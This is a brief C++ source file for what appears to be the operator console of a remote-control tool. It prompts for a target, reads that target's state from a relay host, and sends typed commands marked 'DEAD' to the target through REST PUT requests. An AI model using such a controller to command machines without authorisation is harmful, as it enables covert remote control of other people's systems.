#include "Propeties.h"

#ifdef MASTER

#include "Helpers.h"
#include "Rest.h"

#include <iostream>
#include <string>

int main() {

	std::cout << "Welcome back.\n";

	std::string target = "";

	while (true) {
		if (target == "") {
			std::cout << "TARGET > ";
			std::cin >> target;
		}

		const std::wstring statePath = Helpers::ToUTF16("/dms/" + target + "/state.json", CP_UTF8);
		const REST::Response state = REST::SendRequest(HOST, statePath, L"GET");

		std::string buffer = "";

		std::cout << target << " > ";
		std::cin >> buffer;

		const std::string cmd = Helpers::Trim(buffer);

		if (cmd == "EXIT") {
			break;
		} else if (cmd == "SWITCH") {
			target = "";
			continue;
		}

		const std::wstring targetPath = Helpers::ToUTF16("/dms/" + target + ".json", CP_UTF8);
		const std::string body = "{ \"state\": \"DEAD\", \"cmd\": \"" + cmd + "\" }";

		const REST::Response response = REST::SendRequest(HOST, targetPath, L"PUT", body);

		std::cout << response.body << '\n';
	}

	std::cout << "Until next time.\n";

	return 0;
}

#endif

